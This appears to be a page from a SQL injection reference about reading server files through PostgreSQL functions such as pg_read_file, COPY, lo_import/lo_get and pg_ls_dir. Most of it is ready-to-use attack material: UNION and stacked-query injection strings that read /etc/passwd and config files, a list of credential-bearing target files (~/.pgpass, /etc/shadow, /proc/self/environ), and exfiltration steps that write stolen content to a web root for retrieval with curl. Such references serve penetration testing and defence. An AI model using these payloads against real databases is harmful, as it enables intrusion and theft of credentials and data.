---
title: Reading Files
description: Techniques for reading files from the filesystem using PostgreSQL
category: Advanced Techniques
order: 16
tags: ["file operations", "pg_read_file", "privilege escalation"]
lastUpdated: 2025-12-07
---

## Reading Files

PostgreSQL provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To read files from PostgreSQL, you typically need:

1. Superuser privileges, OR
2. Membership in the `pg_read_server_files` role (PostgreSQL 11+)
3. The file must be readable by the `postgres` OS user

### pg_read_file() Function

The primary method for reading files (requires superuser):

```sql
-- Read entire file
SELECT pg_read_file('/etc/passwd');

-- Read specific bytes (offset, length)
SELECT pg_read_file('/etc/passwd', 0, 100);

-- Read with missing file handling (PostgreSQL 11+)
SELECT pg_read_file('/etc/passwd', missing_ok => true);
```

### pg_read_binary_file() Function

For reading binary files:

```sql
SELECT pg_read_binary_file('/path/to/file');

-- Convert to hex for display
SELECT encode(pg_read_binary_file('/path/to/binary'), 'hex');
```

### Using COPY

The `COPY` command can read files into a table:

```sql
-- Create a table to hold file contents
CREATE TABLE file_contents (line TEXT);

-- Read file into table
COPY file_contents FROM '/etc/passwd';

-- Query the contents
SELECT * FROM file_contents;

-- Clean up
DROP TABLE file_contents;
```

### Using Large Objects

Large objects can be used for file operations. The simplest approach uses `lo_import` and `lo_export`:

```sql
-- Import file as large object (returns OID)
SELECT lo_import('/etc/passwd');
-- Returns OID, e.g., 12345
```

**Important:** `lo_export()` writes the large object to the **database server's filesystem**, not to the attacker's machine. An additional exfiltration step is required to retrieve the data:

```sql
-- Option 1: Export to server, then read via pg_read_file (file must be in data_directory)
SELECT lo_export(12345, '/var/lib/postgresql/15/main/exfil.txt');
SELECT pg_read_file('exfil.txt');  -- Reads from data_directory

-- Option 2: Export to web-accessible directory (if writable)
SELECT lo_export(12345, '/var/www/html/exfil.txt');
-- Then fetch via HTTP: curl http://target/exfil.txt

-- Option 3: Use lo_get() to retrieve content directly via SQL result (preferred)
SELECT convert_from(lo_get(12345), 'UTF8');
```

For direct content retrieval, use `lo_get` (PostgreSQL 9.4+):

```sql
-- Import and read in one step (preferred for SQL injection)
SELECT lo_get(lo_import('/etc/passwd'));

-- Or with explicit OID
SELECT convert_from(lo_get(12345), 'UTF8');
```

**Note:** The older transaction-based API (`lo_open`/`loread`) exists but offers no advantage over `lo_get()` for SQL injection and requires stacked queries with file descriptor management.

### pg_ls_dir() Function

List directory contents (requires superuser):

```sql
-- List files in directory
SELECT pg_ls_dir('/etc');

-- List PostgreSQL data directory
SELECT pg_ls_dir(current_setting('data_directory'));
```

### Important Target Files

| File Path                                  | Description                       |
| ------------------------------------------ | --------------------------------- |
| `/etc/passwd`                              | System users                      |
| `/etc/shadow`                              | Password hashes (rarely readable) |
| `/var/lib/postgresql/data/pg_hba.conf`     | PostgreSQL authentication config  |
| `/var/lib/postgresql/data/postgresql.conf` | PostgreSQL main config            |
| `/var/www/html/config.php`                 | Web application config            |
| `/proc/version`                            | Kernel version                    |
| `/proc/self/environ`                       | Environment variables             |
| `~/.pgpass`                                | PostgreSQL password file          |

### Configuration File Locations

```sql
-- Get config file location
SELECT current_setting('config_file');

-- Get HBA file location
SELECT current_setting('hba_file');

-- Get data directory
SELECT current_setting('data_directory');
```

### Injection Examples

```sql
-- Read /etc/passwd
' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--

-- List directory
' UNION SELECT NULL,string_agg(pg_ls_dir('/etc'),E'\n'),NULL--

-- Read PostgreSQL config
' UNION SELECT NULL,pg_read_file(current_setting('config_file')),NULL--

-- Using COPY (stacked query required)
'; CREATE TABLE temp(data TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp--
```

### Bypassing Restrictions

#### Using Symlinks

If direct paths are blocked:

```sql
-- May follow symlinks if they exist
SELECT pg_read_file('/proc/self/root/etc/passwd');
```

#### Encoding Output

For binary files or to avoid display issues:

```sql
SELECT encode(pg_read_file('/etc/passwd')::bytea, 'base64');
SELECT encode(pg_read_file('/etc/passwd')::bytea, 'hex');
```

### PostgreSQL 11+ Role-Based Access

```sql
-- Check if user has file read privileges
SELECT pg_has_role(current_user, 'pg_read_server_files', 'member');
```

### Notes

- `pg_read_file()` requires superuser privileges by default; file access is constrained by the OS permissions of the postgres user
- PostgreSQL 11+ introduced the `pg_read_server_files` role, which allows non-superusers to read server files under the same OS permission constraints
- All file operations run as the `postgres` system user, so only files readable by that user can be accessed
- Use `missing_ok => true` to avoid errors on missing files
